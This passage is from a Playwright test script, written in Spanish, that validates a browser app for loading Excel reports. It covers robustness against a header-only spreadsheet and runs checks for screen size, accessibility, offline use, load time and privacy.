  casos.push([guardarXlsx(soloEncabezados, "solo-encabezados.xlsx"), /no tiene reportes/, "un Excel solo con encabezados"]);

  await pagina.evaluate(() => App.cargarEjemplo());
  await pagina.click("#btn-cargar");
  for (const [ruta, esperado, descripcion] of casos) {
    await pagina.setInputFiles("#archivo", ruta);
    await pagina.waitForFunction(() => /No se/.test(document.getElementById("resultado-carga").textContent), null, { timeout: 5000 }).catch(() => {});
    const mensaje = await pagina.textContent("#resultado-carga");
    comprobar(esperado.test(mensaje) && await pagina.evaluate(() => App.estado.origen.tipo === "ejemplo" && App.estado.datos.reportes.length === 200),
      descripcion + ": mensaje claro y se conservan los datos", mensaje.slice(0, 160));
  }
  comprobar(problemas.length === 0, "archivos hostiles: sin errores de la página", problemas);
  await contexto.close();
}

// ---------------------------------------------------------------------------
(async () => {
  fs.mkdirSync(CARPETA_CAPTURAS, { recursive: true });
  const navegador = await chromium.launch();
  resultados.navegador = "Chromium " + navegador.version();
  const secciones = [
    ["a) Tamaños de pantalla", async () => { for (const t of TAMANOS) await revisarTamano(navegador, t); }],
    ["b) Accesibilidad y teclado", () => accesibilidad(navegador)],
    ["c) Compatibilidad", () => compatibilidad(navegador)],
    ["d) Sin conexión", () => sinConexion(navegador)],
    ["e) Tiempo de carga", () => tiempos(navegador)],
    ["f) Ningún dato sale del dispositivo", () => privacidad(navegador)],
    ["g) Archivos maliciosos o dañados", () => archivosHostiles(navegador)]
  ];
  for (const [titulo, fn] of secciones) {
    console.log("\n" + titulo);
    try { await fn(); } catch (e) { comprobar(false, titulo + ": la prueba se detuvo: " + e.message.split("\n")[0]); }
  }
  await navegador.close();
  fs.rmSync(tmp, { recursive: true, force: true });
  resultados.resumen = { correctas: registro.aciertos, fallas: registro.fallas };
  resultados.comprobaciones = registro.resultados;
  fs.writeFileSync(path.join(RAIZ, "docs", "validacion-resultados.json"), JSON.stringify(resultados, null, 2) + "\n");
  console.log(`\n${registro.aciertos} comprobaciones correctas, ${registro.fallas} fallas. Resultados en docs/validacion-resultados.json`);
  process.exit(registro.fallas ? 1 : 0);
})();
